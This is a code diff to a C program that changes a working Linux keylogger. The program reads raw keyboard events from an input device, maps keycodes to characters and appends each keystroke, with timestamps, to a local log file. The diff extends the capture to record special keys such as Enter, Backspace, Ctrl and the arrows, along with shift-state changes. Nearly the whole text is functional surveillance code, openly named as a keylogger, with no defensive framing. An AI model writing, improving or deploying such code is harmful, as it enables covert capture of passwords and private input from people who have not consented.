@@ -225,82 +225,181 @@ void keylogger_operations_cli(int argc, char *argv[]) {
 
 
 void run_keylogger() {
+
     const char *device = "/dev/input/event2"; 
+
     int fd = open(device, O_RDONLY);
+
     if (fd == -1) {
+
         perror("Error opening input device");
+
         exit(1);
+
     }
+
+
 
     struct input_event ev;
+
     FILE *keylog = fopen("keylog.txt", "a");
+
     if (!keylog) {
+
         perror("Error opening keylog.txt");
+
         close(fd);
+
         exit(1);
+
     }
 
+
+
     // Add a timestamp to the log
+
     time_t now = time(NULL);
-    fprintf(keylog, "Keylogger session started at %s\n", ctime(&now));
+
+    fprintf(keylog, "\nKeylogger session started at %s\n", ctime(&now));
+
     fflush(keylog);
 
-// Keymap for keycode-to-character mapping
+
+
+    // Keymap for keycode-to-character mapping
+
     char *keymap[] = {
+
         [2] = "1", [3] = "2", [4] = "3", [5] = "4", [6] = "5",
+
         [7] = "6", [8] = "7", [9] = "8", [10] = "9", [11] = "0",
+
         [16] = "q", [17] = "w", [18] = "e", [19] = "r", [20] = "t",
+
         [21] = "y", [22] = "u", [23] = "i", [24] = "o", [25] = "p",
+
         [30] = "a", [31] = "s", [32] = "d", [33] = "f", [34] = "g",
+
         [35] = "h", [36] = "j", [37] = "k", [38] = "l",
+
         [44] = "z", [45] = "x", [46] = "c", [47] = "v", [48] = "b",
-        [49] = "n", [50] = "m", [57] = " "
+
+        [49] = "n", [50] = "m"
+
     };
 
+
+
     int shift_pressed = 0; // Track Shift key status
+
     int key_states[KEY_MAX] = {0}; // Array to track key states (0 = released, 1 = pressed)
 
 
 
     while (1) {
-        // Read input events
+
         if (read(fd, &ev, sizeof(struct input_event)) > 0) {
-            // Check for Shift key press/release
+
+            // Handle Shift key press/release
+
             if (ev.type == EV_KEY && (ev.code == 42 || ev.code == 54)) { // Left or Right Shift
+
                 shift_pressed = ev.value; // 1 = pressed, 0 = released
+
+                fprintf(keylog, shift_pressed ? "[SHIFT_PRESSED] " : "[SHIFT_RELEASED] ");
+
+                fflush(keylog);
+
             }
 
-            // Log key press events only once
+
+
+            // Handle other keys
+
             if (ev.type == EV_KEY && ev.value == 1) { // Key press event
+
                 if (key_states[ev.code] == 0) { // Check if key is already pressed
+
                     key_states[ev.code] = 1; // Mark key as pressed
 
-                    // Skip logging modifiers directly
-                    if (ev.code == 42 || ev.code == 54 || ev.code == 29 || ev.code == 97 || ev.code == 56) {
-                        continue;
+
+
+                    // Special key handling
+
+                    switch (ev.code) {
+
+                        case 1: fprintf(keylog, "[ESC] "); break;
+
+                        case 28: fprintf(keylog, "[ENTER]\n"); break;
+
+                        case 57: fprintf(keylog, "[SPACE] "); break;
+
+                        case 14: fprintf(keylog, "[BACKSPACE] "); break;
+
+                        case 29: fprintf(keylog, "[CTRL] "); break;
+
+                        case 56: fprintf(keylog, "[ALT] "); break;
+
+                        case 125: fprintf(keylog, "[FN] "); break;
+
+                        case 103: fprintf(keylog, "[UP_ARROW] "); break;
+
+                        case 108: fprintf(keylog, "[DOWN_ARROW] "); break;
+
+                        case 105: fprintf(keylog, "[LEFT_ARROW] "); break;
+
+                        case 106: fprintf(keylog, "[RIGHT_ARROW] "); break;
+
+                        case 58: fprintf(keylog, "[CAPSLOCK] "); break;
+
+                        default:
+
+                            if (ev.code < sizeof(keymap) / sizeof(char *) && keymap[ev.code] != NULL) {
+
+                                // Log regular keys
+
+                                if (shift_pressed && isalpha(keymap[ev.code][0])) {
+
+                                    fprintf(keylog, "%c", toupper(keymap[ev.code][0]));
+
+                                } else {
+
+                                    fprintf(keylog, "%s", keymap[ev.code]);
+
+                                }
+
+                            }
+
+                            break;
+
                     }
 
-                    // Log mapped keys
-                    if (ev.code < sizeof(keymap) / sizeof(char *) && keymap[ev.code] != NULL) {
-                        // Handle Shift for uppercase letters
-                        if (shift_pressed && isalpha(keymap[ev.code][0])) {
-                            fprintf(keylog, "Key pressed: %c\n", toupper(keymap[ev.code][0]));
-                        } else {
-                            fprintf(keylog, "Key pressed: %s\n", keymap[ev.code]);
-                        }
-                    }
                     fflush(keylog);
+
                 }
+
             }
 
-            // Update key state on release
+
+
+            // Handle key release
+
             if (ev.type == EV_KEY && ev.value == 0) { // Key release event
+
                 key_states[ev.code] = 0; // Mark key as released
+
             }
+
         }
+
     }
 
+
+
     fclose(keylog);
+
     close(fd);
+
     printf("Keylogger stopped.\n");
+
 }
